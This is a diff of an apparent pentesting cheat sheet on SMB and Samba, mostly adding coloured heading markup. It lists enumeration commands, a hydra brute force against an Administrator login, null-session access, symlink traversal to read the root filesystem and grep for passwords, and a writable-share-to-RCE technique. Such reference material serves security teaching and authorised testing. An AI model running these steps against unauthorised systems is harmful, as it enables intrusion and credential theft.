@@ -4,7 +4,7 @@ description: ( TCP 445,139 )
 
 # ⭕ SMB
 
-## :information\_source: Introduction
+## :information\_source: <mark style="color:blue;">Introduction</mark>
 
 #### [Server Message Block](https://datatracker.ietf.org/doc/html/rfc5716)
 
@@ -28,7 +28,7 @@ SMB functions as a request-response or client-server protocol. The only time tha
 * SMB 3.02 / SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.
 * SMB 3.1: This version used in Windows Server 2016 and Windows 10.
 
-## :ballot\_box\_with\_check: Checklist
+## :ballot\_box\_with\_check: <mark style="color:blue;">Checklist</mark>
 
 * [ ] Enumerate hosts, shares and your access to shares
 * [ ] Check for null sessions
@@ -37,7 +37,7 @@ SMB functions as a request-response or client-server protocol. The only time tha
 * [ ] Try to mount and access files in shares
 * [ ] Check for CVEs
 
-## Quick Check
+## <mark style="color:red;">Quick Check</mark>
 
 ```
 rpcinfo -p $TARGET
@@ -52,39 +52,24 @@ smbclient -L //$TARGET
 enum4linux $TARGET
 ```
 
-## Enumeration
+## <mark style="color:red;">Enumeration</mark>
 
 {% embed url="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration" %}
 
-### RPC / NetBios / SMB
-
-```
-rpcinfo -p $TARGET
-nbtscan $TARGET
-
-#list shares
-smbclient -L //$TARGET -U ""
-
-# null session
-rpcclient -U "" $TARGET
-smbclient -L //$TARGET
-enum4linux $TARGET
-```
-
-### Service Detection
+### <mark style="color:orange;">Service Detection</mark>
 
 ```
 nmap -sT –sU -sV 192.168.13.26 -p135,137,138,139,445 --open
 ```
 
-### Hostname Enumeration
+### <mark style="color:orange;">Hostname Enumeration</mark>
 
 ```
 nmblookup -A [ip]
 enum4linux -a [ip]
 ```
 
-### Shares Enumeration
+### <mark style="color:orange;">Shares Enumeration</mark>
 
 ```
 smbmap -H [ip/hostname]
@@ -92,7 +77,7 @@ echo exit | smbclient -L \\\\[ip]
 nmap --script smb-enum-shares -p 139,445 [ip]
 ```
 
-### Check for Null Sessions
+### <mark style="color:orange;">Check for Null Sessions</mark>
 
 ```
 smbmap -H [ip/hostname]
@@ -100,13 +85,13 @@ rpcclient -U "" -N [ip]
 smbclient \\\\[ip]\\[share name]
 ```
 
-### Check for CVEs
+### <mark style="color:orange;">Check for CVEs</mark>
 
 ```
 nmap --script smb-vuln* -p 139,445 [ip]
 ```
 
-### Manual Inspection
+### <mark style="color:orange;">Manual Inspection</mark>
 
 ```
 smbver.sh [IP] (port) [Samba]
@@ -114,7 +99,7 @@ smbver.sh [IP] (port) [Samba]
 
 #### remember to check pcap (packet capture) files for SMB authentication and credentials.
 
-### nmap scrips
+### <mark style="color:orange;">nmap scrips</mark>
 
 ```
 nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1
@@ -134,7 +119,7 @@ nmap -sU -p137 --script smb-enum-sessions [target]
 nmap -p445 --script smb-vuln-double-pulsar-backdoor [target]
 ```
 
-## Linux
+## <mark style="color:red;">Linux</mark>
 
 Samba, a Linux-based implementation of the SMB/CIFS protocols, provides print and file sharing services for windows clients within an environment. Recent versions also seamlessly can be integrated with Active Directory domains
 
@@ -142,7 +127,7 @@ Samba can be found listening on the usual “NetBIOS” ports:
 
 ![](<../../.gitbook/assets/image (41) (1).png>)
 
-### fix smbclient protocol negotiation failed error
+### <mark style="color:orange;">fix smbclient protocol negotiation failed error</mark>
 
 you might face this error on some of the enumeration tools in kali or any other Pentesting distro so i though i should say something about this.
 
@@ -157,7 +142,7 @@ client max protocol = SMB3
 
 this is a config file for smb service on your hacking machine and might interfere with some other services remember to change the protocol version later.
 
-### Access Shares - smbclient
+### <mark style="color:orange;">Access Shares - smbclient</mark>
 
 #### list shares
 
@@ -181,7 +166,7 @@ smbclient \\\\192.168.30.53\\WorkSharing
 get [filename].txt /root/Desktop/[filename].txt 
 ```
 
-### smbmap
+### <mark style="color:orange;">smbmap</mark>
 
 installation:
 
@@ -210,7 +195,7 @@ smbmap -H [ip]
 --skip --> skip delete confirm prompt
 ```
 
-### enum4linux
+### <mark style="color:orange;">enum4linux</mark>
 
 ```
 apt-get install ldapscripts  
@@ -236,7 +221,7 @@ cheat sheet:
 
 {% embed url="https://highon.coffee/blog/enum4linux-cheat-sheet/" %}
 
-### nbtscan
+### <mark style="color:orange;">nbtscan</mark>
 
 ```
 nbtscan -v [IP Address orr address range IE /24]>
@@ -245,9 +230,9 @@ nbtscan [ip]
 
 if you then see something like ELS-WINXP <20> Unique Registered -- then there is a server or share
 
-## Windows
+## <mark style="color:red;">Windows</mark>
 
-### NetBIOS
+### <mark style="color:orange;">NetBIOS</mark>
 
 NetBIOS stands for Network Basic Input Output System. Servers and clients use NetBIOS when viewing network shares on the local area network.
 
@@ -276,7 +261,7 @@ When an MS Windows machine browses a network, it uses NetBIOS:
 
 A Windows machine can share a file or a directory on the network; this lets local and remote users access the resource and, possibly, modify it. Starting from Windows Vista, users can choose to share a single file or use the Public directory. When sharing a single file, they can choose local or remote users to share the file with. When using the Public directory, they can choose which local users can access the files on the share, but they can only allow everyone or no one in the network to access the share.
 
-### UNC Paths
+### <mark style="color:orange;">UNC Paths</mark>
 
 An authorized user can access shares by using Universal Naming Convention paths (UNC paths).
 
@@ -286,7 +271,7 @@ The format of a UNC path is:
 \\ServerName\ShareName\file.nat
 ```
 
-### Administrative Shares
+### <mark style="color:orange;">Administrative Shares</mark>
 
 There are also some special default administrative shares which are used by system administrators and Windows itself:
 
@@ -298,14 +283,14 @@ There are also some special default administrative shares which are used by syst
 
 ​​You can test volume shares and the admin$ share on your computer by entering the following on your Windows Explorer address bar
 
-## SMB Login Brute Force
+## <mark style="color:red;">SMB Login Brute Force</mark>
 
 ```
 hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://172.16.2.11 -t 1 -vV -I
 use auxiliary/scanner/smb/smb_login
 ```
 
-## Symlink Directory Traversal
+## <mark style="color:red;">Symlink Directory Traversal</mark>
 
 #### The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory. Although this vulnerability can be exploited using a modified “smbclient,” Metasploit contains a module for exploitation, so we’ll use that for our purposes.
 
@@ -325,7 +310,7 @@ smbmap -H 192.168.13.29
 
 ![](<../../.gitbook/assets/image (276) (1) (1).png>)
 
-#### Once we’ve determined a writeable share is available, in this case `“tmp,”` we can use Metasploit’s “samba\_symlink\_traversal” auxiliary module to create the symlink to the root filesystem.
+#### <mark style="color:green;">Once we’ve determined a writeable share is available, in this case</mark> <mark style="color:green;"></mark><mark style="color:green;">`“tmp,”`</mark> <mark style="color:green;"></mark><mark style="color:green;">we can use Metasploit’s “samba\_symlink\_traversal” auxiliary module to create the symlink to the root filesystem.</mark>
 
 ```
 use auxiliary/admin/smb/samba_symlink_traversal
@@ -333,7 +318,7 @@ use auxiliary/admin/smb/samba_symlink_traversal
 
 ![](<../../.gitbook/assets/image (294) (1) (1) (1).png>)
 
-#### We can see from the above output, that a new “rootfs” directory has been created within the “tmp” share.
+#### <mark style="color:green;">We can see from the above output, that a new “rootfs” directory has been created within the “tmp” share.</mark>
 
 Our next step is to use “smbclient,” as we’ve seen from previous sections, to access the share, change into the “rootfs” directory, and download or upload files to the system where and if possible. We can do this with the following command:
 
@@ -374,7 +359,7 @@ root@tester# cd /tmp/rootfs/tmp/rootfs/etc/
 root@tester# grep -r "password" * 2>&1 /dev/null
 ```
 
-## From Writable Share to RCE
+## <mark style="color:red;">From Writable Share to RCE</mark>
 
 In certain situations where we have a fully patched Samba server, but have a writeable share available to us,we discover that a server we have enumerated is running a patched Samba server, and contains a share named “www,” which appears to be possibly configured to allow administrators to easily update an internal web applicationUsing our previous checks for Samba version and available shares using the Nmap smb-os-discovery NSE script, and smbmap, we have determined OS and Samba Version:
 
@@ -442,7 +427,7 @@ smb: \> put test.pl
 
 Next, let’s point a browser to our test.pl file on the target system and confirm that the output of the “id” command is printed to the page. This will confirm for us that we can upload our own Perl scripts to the server and can execute remote operating system commands through our test script
 
-## Null Sessions
+## <mark style="color:red;">Null Sessions</mark>
 
 Null session attacks can be used to enumerate a lot of information. Attackers can steal information about:
 
@@ -455,7 +440,7 @@ Null session attacks can be used to enumerate a lot of information. Attackers ca
 
 Null sessions are remotely exploitable; this means that attackers can use their computers to attack a vulnerable Windows machine. Moreover, this attack can be used to call remote APIs and remote procedure calls. Because of these factors, null session attacks had a huge impact on Windows ecosystems. Nowadays Windows is configured to be immune from this kind of attack. However, legacy hosts can still be vulnerable! A null session attack exploits an authentication vulnerability for Windows Administrative Shares; this lets an attacker connect to a local or remote share without authentication We will go through the enumeration of windows shares and their exploitation by using various techniques and tools.
 
-### nbtstat
+### <mark style="color:orange;">nbtstat</mark>
 
 In Windows, the most common command to use when enumerating Windows shares is nbtstat. Nbtstat is a Windows command line tool that can display information about a target. You can check how to use it by passing it the /? parameter The most common use of nbtstat is "nbtstat -A \[IP]" that displays information about a target
 
@@ -479,7 +464,7 @@ nmblookup -A [target ip ]
 
 ![](<../../.gitbook/assets/image (38) (1).png>)
 
-## Checking for Null Sessions
+## <mark style="color:red;">Checking for Null Sessions</mark>
 
 Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it is time to check if a null session attack is possible To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.
 
@@ -500,7 +485,7 @@ net use \\10.130.40.80\IPC$ '' /u:''
 
 This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
 
-### metasploit modules
+### <mark style="color:orange;">metasploit modules</mark>
 
 ```
 use auxiliary/scanner/smb/smb_enumshares
@@ -527,7 +512,7 @@ bin:x:2:2:bin:/bin:/bin/sh
 [..]
 ```
 
-## Mounting Shares From Linux
+## <mark style="color:red;">Mounting Shares From Linux</mark>
 
 ```
 mount.cifs /192.168.99.162/C /media/K_share/ user=,pass=
